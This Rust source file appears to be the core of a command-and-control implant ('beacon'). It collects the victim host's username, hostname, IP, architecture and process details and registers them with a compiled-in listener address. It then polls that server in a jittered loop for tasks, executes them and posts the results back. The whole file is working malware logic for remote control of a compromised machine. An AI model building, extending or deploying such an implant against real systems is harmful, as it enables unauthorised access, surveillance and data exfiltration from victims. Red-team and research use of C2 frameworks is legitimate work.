use crate::tasks;
use crate::transport;

use local_ip_address::local_ip;
use serde;
use std::{thread, time::Duration};

use transport::{ActiveTransport, Transport};

use rand;
use whoami;

fn load_transport() -> ActiveTransport {
    ActiveTransport::new()
}

pub struct Beacon {
    pub id: String,
    pub listener_address: String,
    pub sleep: Duration,
    pub jitter: Duration,
}

impl Beacon {
    fn new() -> Self {
        Beacon {
            id: env!("SESSION_ID").to_string(),
            listener_address: env!("LISTENER_ADDRESS").to_string(),
            sleep: Duration::from_secs(5),
            jitter: Duration::from_secs(2),
        }
    }

    pub fn set_sleep(&mut self, sleep: Duration, jitter: Duration) {
        self.sleep = sleep;
        self.jitter = jitter;
    }
}

#[derive(serde::Serialize, Debug)]
struct RegisterData {
    arch: String,
    platform: String,
    hostname: String,
    username: String,
    ip: String,
    pid: u32, // 1024
    process_name: String,
    sleep: u64,
    jitter: u64,
}

pub async fn start_beacon() {
    let mut beacon = Beacon::new();

    println!("Beacon Session: {}", beacon.id);
    println!("Server: {}", beacon.listener_address);

    let client = load_transport();

    // Register the beacon
    let register_data = get_register_data();
    match client.post_data(&beacon, &register_data).await {
        Ok(_) => {
            println!("Successfully registered beacon.");
        }
        Err(e) => {
            eprintln!("Failed to register beacon: {}", e);
            return;
        }
    }

    loop {
        // fetch tasks
        let mut task_manager = tasks::TasksManager::new();
        match client.fetch_tasks(&beacon).await {
            Ok(tasks_data) => {
                if !tasks_data.is_empty() {
                    println!("Received {} tasks.", tasks_data.len());

                    for task in tasks_data.iter() {
                        if let Err(e) = task_manager.queue(task.clone()) {
                            eprintln!("Failed to queue task: {}", e);
                            continue;
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to receive data: {}", e);
            }
        }

        // dispatch tasks
        match task_manager.dispatch(&mut beacon) {
            Ok(_) => {
                println!("Dispatched tasks successfully.");
            }
            Err(e) => {
                eprintln!("Failed to dispatch tasks: {}", e);
            }
        }

        // post completed tasks
        while !task_manager.completed_tasks.is_empty() {
            let task_result = task_manager.completed_tasks.remove(0);
            println!("Posting task result: {:?}\n", task_result);
            match client.post_data(&beacon, &task_result).await {
                Ok(_) => {
                    println!("Posted task result successfully.");
                }
                Err(e) => {
                    eprintln!("Failed to post task result: {}", e);
                }
            }
        }

        // sleep
        if beacon.jitter.as_secs() == 0 {
            println!("Sleeping for {} seconds...", beacon.sleep.as_secs());
            thread::sleep(beacon.sleep);
            continue;
        }
        let jitter = rand::random::<u64>() % beacon.jitter.as_secs();
        let sleep_duration = beacon.sleep + Duration::from_secs(jitter);
        println!("Sleeping for {} seconds...", sleep_duration.as_secs());
        thread::sleep(sleep_duration);
    }
}

fn get_register_data() -> RegisterData {
    let platform = whoami::platform().to_string();
    let username = whoami::username()
        .expect("failed to get username")
        .to_string();
    let hostname = whoami::hostname()
        .expect("failed to get hostname")
        .to_string();
    let arch = whoami::cpu_arch().to_string();
    let pid = std::process::id();
    let process_name = std::env::current_exe()
        .ok()
        .and_then(|path| {
            path.file_name()
                .map(|name| name.to_string_lossy().into_owned())
        })
        .unwrap_or_else(|| "unknown".to_string());

    let ip = local_ip().expect("failed to get local IP address");

    RegisterData {
        platform,
        username,
        hostname,
        arch,
        pid,
        process_name,
        ip: ip.to_string(),
        sleep: 5,
        jitter: 2,
    }
}
